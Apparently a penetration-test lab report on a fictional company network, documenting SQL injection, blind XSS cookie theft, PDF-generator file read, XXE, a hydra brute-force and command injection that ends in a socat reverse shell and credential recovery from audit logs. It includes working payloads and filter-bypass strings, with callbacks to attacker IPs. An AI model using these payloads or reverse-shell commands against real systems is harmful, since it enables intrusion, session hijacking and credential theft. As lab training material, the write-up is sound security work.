#### External Attack — Part 2: Remaining Subdomains & Internal Foothold

*Continued from External Attack (Part 1).*

---

#### Finding: status.inlanefreight.local — SQL Injection

An internal-looking log search application. Submitting a single quote (`'`) in the search field returned a raw MySQL syntax error, confirming SQL injection. Manual exploitation via a UNION-based payload confirmed database access:

```
' union select null, database(), user(), @@version -- //
```

The vulnerability was then confirmed and automated with `sqlmap` against a captured Burp request (`searchitem` parameter marked as the injection point). sqlmap identified boolean-based blind, error-based, time-based blind, and UNION-based injection techniques, and successfully enumerated the `status` database, including a `users` table containing hashed credentials for `Admin` and `Flag` accounts. Full sqlmap output and payloads: `Evidence/Scans/Vuln/Vuln_evidence.md`.

**Risk:** Full database read access, including credential material, via an unauthenticated SQL injection.

---

#### Finding: support.inlanefreight.local — Blind XSS → Session Hijacking

The IT support ticketing portal (`/ticket.php`) reflected unsanitized input from the ticket "Message" field. A test payload confirmed blind XSS via an out-of-band callback:

```
"><script src=http://10.10.14.120:4444/TESTING_THIS></script>
```

This was weaponized to steal an administrator's session cookie: a small PHP collector (`index.php`) and JavaScript loader (`script.js`) were hosted on an attacker-controlled web server, and a ticket was submitted containing a `<script>` tag pointing to the hosted `script.js`. When an administrator viewed the ticket, their session cookie was exfiltrated to the collector and reused (via a browser cookie-editor extension) to log in as that admin, reaching the ticketing dashboard.

![[Pasted image 20260614084543.png]]

**Finding: Cross-Site Scripting (XSS) — High risk**, as it enables full session hijacking of the ticketing system's administrative user. Full PoC files and server logs: `Evidence/Scans/Web/Web_evidence.md`.

---

#### Finding: tracking.inlanefreight.local — HTML/XSS Injection in PDF Generation → Local File Read → XXE

The order-tracking application accepts a "Tracking #" value and renders it into a server-generated PDF. This field was found to render arbitrary HTML and execute injected JavaScript at PDF-generation time.

![[Pasted image 20260615082359.png]]

Building on public research into local file disclosure via XSS in PDF generators, an `XMLHttpRequest`-based payload was used to read arbitrary files from the underlying filesystem, confirmed first against `/etc/passwd`:

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){  
document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

![[Pasted image 20260615082510.png]]

**Finding: SSRF-to-Local-File-Read via PDF Generation — High risk.** The same class of vulnerability was subsequently confirmed to be exploitable as **XML External Entity (XXE) Injection**, using a crafted XML payload with an external entity definition to again disclose local file contents:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE userid [
  <!ENTITY xxetest SYSTEM "file:///etc/passwd">
]>
<root>
    <subtotal>
        undefined
    </subtotal>
    <userid>
        &xxetest;
    </userid>
</root>
```

![[Pasted image 20260615110732.png]]

**Finding: XML External Entity (XXE) Injection — High risk.** Full payloads and additional file-read PoCs: `Evidence/Scans/Web/Web_evidence.md`.

---

#### Finding: monitoring.inlanefreight.local — Weak Credentials → Command Injection → Internal Foothold

This host (identified earlier via virtual host fuzzing) redirects to `/login.php`. Authentication bypass payloads and common weak credentials failed, as did manual SQL injection testing of the login form. A credential brute-force with `hydra` against the login form succeeded, recovering `admin`/`12qwaszx` — a weak, easily-guessed "keyboard walk" password.

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials" 
...
[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
```

Authenticated access reveals a restricted monitoring console exposing a limited command set. Testing each available command identified a `connection_test` option that, per Burp Suite analysis, issues a `GET /ping.php?ip=<value>` request executing a shell ping command server-side — a strong command injection candidate.

![[Pasted image 20260615111000.png]]
![[Pasted image 20260615111038.png]]

Standard injection payloads (`;`, `|`) were blocked by input filtering. Filter bypass was achieved by combining a newline character (`%0a`) to separate commands with single-quote character-splitting to defeat keyword blacklisting, and the `$IFS` environment variable in place of literal spaces:

```
$ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"
...
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

This confirmed **Command Injection** as the `webdev` user. Interface enumeration (via the same technique) showed the host dual-homed onto `172.16.8.0/23` — part of the internal testing scope — making this host a viable pivot point into the internal network:

```
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.8.120  netmask 255.255.254.0  broadcast 172.16.255.255
```

**Reverse shell.** Reviewing `ping.php`'s filter logic (retrieved via the same injection primitive) showed most shell/networking keywords blacklisted, but `socat` was not. A `socat`-based reverse shell was delivered through the same injection point, using the newline/`$IFS` bypass established above:

```
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
```

This yielded a working, if non-interactive, shell as `webdev`. A stable, fully-interactive TTY was then established using a `socat` listener on the attacking host paired with a `socat exec:'bash -li',pty,...` callback from the target — full commands in `Evidence/Scans/AD Enumeration/AD_Enumeration_evidence.md` and `Evidence/Notes/Notes_evidence.md`.

**Privilege escalation to `srvadm`.** With a stable shell, group membership was reviewed:

```
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

Membership in the `adm` group grants read access to system logs under `/var/log`, including Linux audit logs. Reviewing these with `aureport --tty` surfaced a recent, plaintext-visible authentication attempt to the `srvadm` account:

```
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less
...
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
```

This exposed the credential pair `srvadm` / `ILFreightnixadm!`, which was used to switch user successfully:

```
webdev@dmz01:/var/www/html/monitoring$ su srvadm
Password: 
$ id
uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
```

**Finding: Credentials Disclosed via World-Readable Audit Logs — High risk.** Full audit log output: `Evidence/Logging output/Logging_output_evidence.md`.

**Summary for monitoring.inlanefreight.local:** Weak Login Credentials, Command Injection, and Sensitive Credential Disclosure via Audit Logs — combining to provide an internal network foothold as `srvadm` on a dual-homed DMZ host, `dmz01` (`172.16.8.120`).

---

*Continued in Internal Attack — establishing tooling on the pivot host and enumerating the internal Active Directory environment.*
